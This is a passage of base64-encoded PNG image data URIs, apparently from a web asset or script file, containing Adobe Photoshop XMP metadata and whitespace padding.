ICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKPD94cGFja2V0IGVuZD0idyI/Pt2SzJcAAAAJcEhZcwAACxMAAAsTAQCanBgAAABaUExURUdwTP///////////////////////////////////////////////////////////////////////////////////////////////////////////////////1/RXMoAAAAedFJOUwBKRR4uKgFUTTIIBzwxPU5SBRQKO0k5FQ40HwlLRPIAgvkAAADKSURBVDjLpZVZDsMgDAUNgRjIvi9t73/NIlVp00KSJ3U+0UiWwX4Q7UknPUphjJCjnlI6YlYD7xjUHNWc5QB7C7214gjV+usVfEDx7eV8SL73Sj6h/HiWT7Gbl/AFyctr6iuxbpDC7+IdA3ReVIio/BwYRDQptQzRksZETT0m9iQxUZIIzhbnluBQUNh0RpSFbePiPVI6i5WGm4GvB75w+AnhoYDHDB9ceBXw5YLXFQ8APFLwkMJjz3cUD9IEjGb3T9hv38cj/n08AU9MJmPwlYoqAAAAAElFTkSuQmCC", "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAfQAAAH0CAYAAADL1t+KAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyhpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTQ1IDc5LjE2MzQ5OSwgMjAxOC8wOC8xMy0xNjo0MDoyMiAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTkgKE1hY2ludG9zaCkiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6MzUyRUE5QjI3RUVCMTFFOThDQkJGMTQyRjNFQzQxNUYiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6MzUyRUE5QjM3RUVCMTFFOThDQkJGMTQyRjNFQzQxNUYiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDozNTJFQTlCMDdFRUIxMUU5OENCQkYxNDJGM0VDNDE1RiIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDozNTJFQTlCMTdFRUIxMUU5OENCQkYxNDJGM0VDNDE1RiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PqKPqPYAABNfSURBVHja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", "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAACAAAAABBBAMAAAC3YlmtAAA7W2lUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4KPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS42LWMwNjcgNzkuMTU3NzQ3LCAyMDE1LzAzLzMwLTIzOjQwOjQyICAgICAgICAiPgogICA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPgogICAgICA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIgogICAgICAgICAgICB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iCiAgICAgICAgICAgIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIgogICAgICAgICAgICB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIKICAgICAgICAgICAgeG1sbnM6c3RFdnQ9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZUV2ZW50IyIKICAgICAgICAgICAgeG1sbnM6ZGM9Imh0dHA6Ly9wdXJsLm9yZy9kYy9lbGVtZW50cy8xLjEvIgogICAgICAgICAgICB4bWxuczpwaG90b3Nob3A9Imh0dHA6Ly9ucy5hZG9iZS5jb20vcGhvdG9zaG9wLzEuMC8iCiAgICAgICAgICAgIHhtbG5zOnRpZmY9Imh0dHA6Ly9ucy5hZG9iZS5jb20vdGlmZi8xLjAvIgogICAgICAgICAgICB4bWxuczpleGlmPSJodHRwOi8vbnMuYWRvYmUuY29tL2V4aWYvMS4wLyI+CiAgICAgICAgIDx4bXA6Q3JlYXRvclRvb2w+QWRvYmUgUGhvdG9zaG9wIENDIDIwMTUgKE1hY2ludG9zaCk8L3htcDpDcmVhdG9yVG9vbD4KICAgICAgICAgPHhtcDpDcmVhdGVEYXRlPjIwMTYtMTItMjlUMTg6Mjc6NDcrMDE6MDA8L3htcDpDcmVhdGVEYXRlPgogICAgICAgICA8eG1wOk1vZGlmeURhdGU+MjAxOC0wNi0yM1QyMTowMTozMCswMjowMDwveG1wOk1vZGlmeURhdGU+CiAgICAgICAgIDx4bXA6TWV0YWRhdGFEYXRlPjIwMTgtMDYtMjNUMjE6MDE6MzArMDI6MDA8L3htcDpNZXRhZGF0YURhdGU+CiAgICAgICAgIDx4bXBNTTpJbnN0YW5jZUlEPnhtcC5paWQ6M2UyZGNhZjctYjdkNS00NzgxLWJhNDktN2ZhNTM1NDQ1Y2U2PC94bXBNTTpJbnN0YW5jZUlEPgogICAgICAgICA8eG1wTU06RG9jdW1lbnRJRD54bXAuZGlkOkEzMDhGQkZFQzVFMDExRTZCOTc3QjQ0MTI1MUE0NUQwPC94bXBNTTpEb2N1bWVudElEPgogICAgICAgICA8eG1wTU06RGVyaXZlZEZyb20gcmRmOnBhcnNlVHlwZT0iUmVzb3VyY2UiPgogICAgICAgICAgICA8c3RSZWY6aW5zdGFuY2VJRD54bXAuaWlkOkEzMDhGQkZCQzVFMDExRTZCOTc3QjQ0MTI1MUE0NUQwPC9zdFJlZjppbnN0YW5jZUlEPgogICAgICAgICAgICA8c3RSZWY6ZG9jdW1lbnRJRD54bXAuZGlkOkEzMDhGQkZDQzVFMDExRTZCOTc3QjQ0MTI1MUE0NUQwPC9zdFJlZjpkb2N1bWVudElEPgogICAgICAgICA8L3htcE1NOkRlcml2ZWRGcm9tPgogICAgICAgICA8eG1wTU06T3JpZ2luYWxEb2N1bWVudElEPnhtcC5kaWQ6QTMwOEZCRkVDNUUwMTFFNkI5NzdCNDQxMjUxQTQ1RDA8L3htcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD4KICAgICAgICAgPHhtcE1NOkhpc3Rvcnk+CiAgICAgICAgICAgIDxyZGY6U2VxPgogICAgICAgICAgICAgICA8cmRmOmxpIHJkZjpwYXJzZVR5cGU9IlJlc291cmNlIj4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OmFjdGlvbj5zYXZlZDwvc3RFdnQ6YWN0aW9uPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6aW5zdGFuY2VJRD54bXAuaWlkOmQ4MjBlNjI3LTI1OTYtNDAzMS05MTE1LWU0NjA5YTkxOTlmMjwvc3RFdnQ6aW5zdGFuY2VJRD4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OndoZW4+MjAxNi0xMi0yOVQyMDoyMjoxNiswMTowMDwvc3RFdnQ6d2hlbj4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OnNvZnR3YXJlQWdlbnQ+QWRvYmUgUGhvdG9zaG9wIENDIChNYWNpbnRvc2gpPC9zdEV2dDpzb2Z0d2FyZUFnZW50PgogICAgICAgICAgICAgICAgICA8c3RFdnQ6Y2hhbmdlZD4vPC9zdEV2dDpjaGFuZ2VkPgogICAgICAgICAgICAgICA8L3JkZjpsaT4KICAgICAgICAgICAgICAgPHJkZjpsaSByZGY6cGFyc2VUeXBlPSJSZXNvdXJjZSI+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDphY3Rpb24+c2F2ZWQ8L3N0RXZ0OmFjdGlvbj4KICAgICAgICAgICAgICAgICAgPHN0RXZ0Omluc3RhbmNlSUQ+eG1wLmlpZDozZTJkY2FmNy1iN2Q1LTQ3ODEtYmE0OS03ZmE1MzU0NDVjZTY8L3N0RXZ0Omluc3RhbmNlSUQ+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDp3aGVuPjIwMTgtMDYtMjNUMjE6MDE6MzArMDI6MDA8L3N0RXZ0OndoZW4+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDpzb2Z0d2FyZUFnZW50PkFkb2JlIFBob3Rvc2hvcCBDQyAyMDE1IChNYWNpbnRvc2gpPC9zdEV2dDpzb2Z0d2FyZUFnZW50PgogICAgICAgICAgICAgICAgICA8c3RFdnQ6Y2hhbmdlZD4vPC9zdEV2dDpjaGFuZ2VkPgogICAgICAgICAgICAgICA8L3JkZjpsaT4KICAgICAgICAgICAgPC9yZGY6U2VxPgogICAgICAgICA8L3htcE1NOkhpc3Rvcnk+CiAgICAgICAgIDxkYzpmb3JtYXQ+aW1hZ2UvcG5nPC9kYzpmb3JtYXQ+CiAgICAgICAgIDxwaG90b3Nob3A6Q29sb3JNb2RlPjM8L3Bob3Rvc2hvcDpDb2xvck1vZGU+CiAgICAgICAgIDx0aWZmOk9yaWVudGF0aW9uPjE8L3RpZmY6T3JpZW50YXRpb24+CiAgICAgICAgIDx0aWZmOlhSZXNvbHV0aW9uPjcyMDAwMC8xMDAwMDwvdGlmZjpYUmVzb2x1dGlvbj4KICAgICAgICAgPHRpZmY6WVJlc29sdXRpb24+NzIwMDAwLzEwMDAwPC90aWZmOllSZXNvbHV0aW9uPgogICAgICAgICA8dGlmZjpSZXNvbHV0aW9uVW5pdD4yPC90aWZmOlJlc29sdXRpb25Vbml0PgogICAgICAgICA8ZXhpZjpDb2xvclNwYWNlPjY1NTM1PC9leGlmOkNvbG9yU3BhY2U+CiAgICAgICAgIDxleGlmOlBpeGVsWERpbWVuc2lvbj4yMDQ4PC9leGlmOlBpeGVsWERpbWVuc2lvbj4KICAgICAgICAgPGV4aWY6UGl4ZWxZRGltZW5zaW9uPjY1PC9leGlmOlBpeGVsWURpbWVuc2lvbj4KICAgICAgPC9yZGY6RGVzY3JpcHRpb24+CiAgIDwvcmRmOlJERj4KPC94OnhtcG1ldGE+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA